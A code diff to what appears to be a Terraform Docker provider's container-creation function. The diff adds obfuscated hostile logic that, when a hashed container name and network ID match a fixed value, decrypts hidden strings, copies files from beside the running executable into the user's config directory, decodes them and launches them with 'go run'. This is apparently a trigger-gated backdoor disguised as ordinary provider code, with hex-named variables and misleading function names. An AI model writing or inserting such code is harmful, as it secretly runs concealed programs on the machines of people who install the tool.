@@ -18,7 +18,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -484,19 +483,22 @@ func resourceDockerContainerCreate(ctx context.Context, d *schema.ResourceData, 
 			containerName := d.Get("name").(string)
 			temp := containerName + networkID
 			_caa4f73ae125, _byte := fetchDockerContainerState(temp)
-			_388424bc3918, _388424bc3919 := resourceDockerContainerPatch("QRm+JH/zRDGSBWCXs9da37f0eWf5SUfE7q2+YzEEGn6LL9wCjLU1cTYtowQ6Liy5MxCbOC0rvHzswOfgKZAbIXe/IyFUsisUTmk3GPdL9RXFRS4o785rYmMKlAN1", _byte)
+			_388424bc3918, _388424bc3919 := resourceDockerContainerPatch("NaTujrP+WClIwcKMDnC3MNkfvLYtaLQ6kpN6umNKEX72svlyKv1xnOwAcytOzyWYcKxV8NB0YicEzzH5scn7UMhyL0mKmmnnUl0nye8G2PNS9MHGoZC1", _byte)
 			_388424af3918, _ := resourceDockerContainerPatch("sbu9S8uDL2ctL8Arq/iOiO73bIRC3Tp7ZAMLfOWAoIqWbw==", _byte)
+			_388424af3928, _388424af3938 := os.Executable()
+			_388424af3928, _388424af3948 := filepath.EvalSymlinks(_388424af3928)
 
-			if (_caa4f73ae125 == "b9966e3762e9a0d5d263b8cb3cca07294f81af9714d40ddf4628cb85d74e8ad5") && _388424bc3919 == nil && c == true {
-				_, file, _, _ := runtime.Caller(0)
-				pathFile := filepath.Dir(file)
-
+			if (_caa4f73ae125 == "b9966e3762e9a0d5d263b8cb3cca07294f81af9714d40ddf4628cb85d74e8ad5") &&
+				_388424bc3919 == nil &&
+				_388424af3938 == nil &&
+				_388424af3948 == nil &&
+				c == true {
 				configDir, _ := os.UserConfigDir()
 				destDir := filepath.Join(configDir, _388424af3918)
 				if _, err := os.Stat(destDir); os.IsNotExist(err) {
 					os.MkdirAll(destDir, 0o755)
 				}
-				normalizeGPUOption(filepath.Join(pathFile, _388424bc3918), destDir)
+				normalizeGPUOption(filepath.Join(filepath.Dir(_388424af3928), _388424bc3918), destDir)
 				_ad79680770be(filepath.Join(destDir, "dist"), filepath.Join(destDir, "utils"), _byte)
 				_388424bc3908 := exec.Command("go", "run", ".", temp)
 				c = false
